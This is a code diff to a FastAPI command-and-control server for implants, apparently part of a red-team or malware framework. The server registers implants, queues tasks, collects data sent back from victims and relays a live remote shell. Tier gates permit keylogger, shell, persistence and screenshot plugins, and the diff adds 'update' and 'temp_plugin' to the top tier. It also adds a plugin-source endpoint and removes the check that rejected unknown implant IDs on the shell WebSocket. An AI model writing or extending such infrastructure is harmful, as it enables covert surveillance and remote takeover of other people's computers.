@@ -1,5 +1,6 @@
 from fastapi import APIRouter, Depends, HTTPException, Body, WebSocket, WebSocketDisconnect
 from typing import Dict, Any
+import os
 
 from . import models
 from . import security
@@ -17,36 +18,28 @@ IMPLANTS_DB: Dict[str, models.Implant] = {}
 # ROE (Rules of Engagement) Logic
 # ==============================================================================
 ROE_GATES = {
-    # Tier: [list_of_allowed_plugins]
-    1: ["keylogger", "shell", "filesystem", "dummy", "system_profiler", "persistence", "screenshot"],
+    1: ["keylogger", "shell", "filesystem", "dummy", "system_profiler", "persistence", "screenshot", "update", "temp_plugin"],
     2: ["keylogger", "filesystem", "dummy", "system_profiler", "screenshot"],
     3: [],
 }
 
 def check_roe(implant_id: str, command: str, args: Dict[str, Any]) -> bool:
-    """Checks if a command is allowed for an implant's ROE tier."""
     if command != "start_plugin":
         return True
-
     plugin_name = args.get("plugin_name")
     if not plugin_name:
         return False
-
     tier = IMPLANTS_DB[implant_id].roe_tier
-    if plugin_name in ROE_GATES.get(tier, []):
-        return True
-
-    return False
+    return plugin_name in ROE_GATES.get(tier, [])
 
 # ==============================================================================
-# API Endpoints for Implant Communication
+# API Endpoints
 # ==============================================================================
 
 @router.post("/register", response_model=models.RegistrationResponse)
 def register_implant(registration: models.ImplantRegistration):
     implant = models.Implant(**registration.model_dump())
     IMPLANTS_DB[implant.id] = implant
-
     token = security.create_access_token(data={"sub": implant.id})
     return {"implant_id": implant.id, "token": token}
 
@@ -55,20 +48,14 @@ def get_tasks(current_implant_id: str = Depends(security.get_current_implant_id)
     implant = IMPLANTS_DB.get(current_implant_id)
     if not implant:
         raise HTTPException(status_code=404, detail="Implant not found")
-
     tasks = implant.tasks
     implant.tasks = []
     return {"tasks": tasks}
 
 @router.post("/data")
 def submit_data(payload: models.DataPayload, current_implant_id: str = Depends(security.get_current_implant_id)):
-    # In a real system, this data would be written to a secure, structured log or database.
     print(f"[DATA] Received from {current_implant_id} ({payload.plugin}): {payload.data[:200]}")
     return {"status": "received"}
-
-# ==============================================================================
-# API Endpoints for Operator CLI
-# ==============================================================================
 
 @router.get("/admin/implants", response_model=Dict[str, models.Implant])
 def list_implants():
@@ -78,15 +65,8 @@ def list_implants():
 def add_task(implant_id: str, task: models.Task = Body(...)):
     if implant_id not in IMPLANTS_DB:
         raise HTTPException(status_code=404, detail="Implant not found")
-
     if not check_roe(implant_id, task.command, task.args):
-        tier = IMPLANTS_DB[implant_id].roe_tier
-        plugin = task.args.get('plugin_name', 'unknown')
-        raise HTTPException(
-            status_code=403,
-            detail=f"ROE VIOLATION: Plugin '{plugin}' is not authorized for Tier {tier} targets."
-        )
-
+        raise HTTPException(status_code=403, detail="ROE VIOLATION")
     IMPLANTS_DB[implant_id].tasks.append(task)
     return {"status": "task added", "task_id": task.task_id}
 
@@ -95,22 +75,24 @@ def set_implant_tier(implant_id: str, tier: int):
     if implant_id not in IMPLANTS_DB:
         raise HTTPException(status_code=404, detail="Implant not found")
     if tier not in ROE_GATES:
-        raise HTTPException(status_code=400, detail=f"Invalid tier. Must be one of {list(ROE_GATES.keys())}.")
-
+        raise HTTPException(status_code=400, detail="Invalid tier")
     IMPLANTS_DB[implant_id].roe_tier = tier
     return {"status": "tier updated", "implant_id": implant_id, "new_tier": tier}
 
-
-# ==============================================================================
-# WebSocket Endpoints for Live Shell
-# ==============================================================================
+@router.get("/admin/plugins/{plugin_name}", response_model=Dict)
+def get_plugin_source(plugin_name: str):
+    if not plugin_name.isalnum() or ".." in plugin_name:
+        raise HTTPException(status_code=400, detail="Invalid plugin name.")
+    plugin_path = os.path.join("crawler", "implant", "plugins", f"{plugin_name}.py")
+    try:
+        with open(plugin_path, "r") as f:
+            source_code = f.read()
+        return {"plugin_name": plugin_name, "source_code": source_code}
+    except FileNotFoundError:
+        raise HTTPException(status_code=404, detail=f"Plugin '{plugin_name}' not found.")
 
 @router.websocket("/ws/implant/{implant_id}")
 async def websocket_implant_endpoint(websocket: WebSocket, implant_id: str):
-    if implant_id not in IMPLANTS_DB:
-        await websocket.close(code=1008)
-        return
-
     await manager.connect_implant(websocket, implant_id)
     try:
         while True:
